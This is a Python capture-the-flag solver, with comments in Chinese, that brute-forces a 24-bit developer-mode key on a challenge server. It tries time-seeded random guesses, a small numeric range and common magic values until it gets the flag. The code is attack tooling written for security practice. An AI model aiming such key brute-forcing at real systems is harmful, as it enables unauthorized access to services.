#!/usr/bin/env python3
import socket
import time
import re

def connect_and_test_key(key):
    """测试单个密钥"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect(("ghost-in-the-stack.chall.edgesecurity.team", 1344))
        
        # 接收菜单
        s.recv(1024)
        
        # 选择选项1
        s.send(b"1\n")
        time.sleep(0.1)
        
        # 接收subscription提示
        s.recv(1024)
        
        # 发送密钥
        s.send(f"{key}\n".encode())
        time.sleep(0.2)
        
        # 接收响应
        response = s.recv(4096).decode(errors='ignore')
        
        s.close()
        
        if "Developer mode activated!" in response:
            print(f"[SUCCESS] 密钥 {key} 成功!")
            print(f"[FLAG] {response}")
            return True
            
        return False
        
    except Exception as e:
        return False

def main():
    print("[+] 简单暴力破解方法")
    print("[+] 目标: 直接调用debug_print_api_key")
    
    # 方法1: 时间相关的种子暴力破解
    print("[*] 尝试基于时间的种子值...")
    
    import random
    current_time = int(time.time())
    
    # 尝试当前时间附近的seed值
    for time_offset in range(-300, 301):  # 前后5分钟
        seed_time = current_time + time_offset
        
        # 模拟srand(time) + rand() & 0xFFFFFF
        random.seed(seed_time)
        # 注意：Python的random和C的rand()不完全相同，但可以作为近似
        possible_key = random.getrandbits(24)
        
        if time_offset % 60 == 0:  # 每分钟打印一次
            print(f"[*] 测试时间 {seed_time}, 密钥 {possible_key}")
        
        if connect_and_test_key(possible_key):
            return
    
    # 方法2: 小范围暴力破解
    print("[*] 尝试小范围暴力破解...")
    for key in range(0, 10000):
        if key % 1000 == 0:
            print(f"[*] 测试范围 {key}-{key+999}")
        
        if connect_and_test_key(key):
            return
    
    # 方法3: 常见值测试
    print("[*] 测试常见值...")
    common_values = [
        0, 1, 42, 123, 1337, 0xDEAD, 0xBEEF, 0xCAFE, 
        0x12345, 0x54321, 0xABCDE, 0xFFFFF
    ]
    
    for val in common_values:
        val = val & 0xFFFFFF  # 确保是24位
        print(f"[*] 测试常见值: {val} (0x{val:x})")
        if connect_and_test_key(val):
            return
    
    print("[-] 所有方法都失败了")

if __name__ == "__main__":
    main()